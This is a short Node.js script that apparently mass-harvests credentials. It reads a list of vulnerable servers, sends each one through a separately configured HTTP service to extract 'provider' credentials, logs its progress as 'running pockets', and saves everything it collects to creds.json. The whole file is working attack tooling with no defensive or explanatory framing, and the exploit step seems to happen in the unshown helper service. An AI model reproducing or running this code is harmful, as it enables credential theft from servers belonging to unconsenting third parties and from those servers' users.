import { request } from "undici";
import { writeFileSync } from "node:fs";
import config from "./config.json" assert { type: "json" };
import vulnerableServers from "./vulnServers.json" assert { type: "json" };
import chalk from "chalk";

(async () => {
	let credentials = [];
	const promises = vulnerableServers.map(async (ip) => {
		console.log(chalk.yellow(`[o] running "${ip.ip}:${ip.port}"'s pockets.`));
		let resp;
		try {
			resp = await request(
				`http://${config.http.host}:${config.http.port}/${ip.ip}:${ip.port}`,
			).then(({ body }) => body.json());
		} catch (e) {
			return;
		}
		if (resp?.data?.length) {
			console.log(
				chalk.green(
					`[+] (${ip.ip}:${ip.port}) they have ${
						resp.data.length
					} provider(s) (${resp.data
						.map((provider) => provider.host)
						.join(", ")})! ${promises.length - progress} servers left.`,
				),
			);
			credentials.push(...resp.data);
		} else {
			console.log(
				chalk.red(
					`[-] (${ip.ip}:${ip.port}) they have no providers. ${
						promises.length - progress
					} servers left.`,
				),
			);
		}
	});
	let progress = 0;
	promises.forEach((p) => p.then(() => progress++));
	await Promise.all(promises);
	console.log(credentials);
	writeFileSync("creds.json", JSON.stringify(credentials, null, 4));
})();
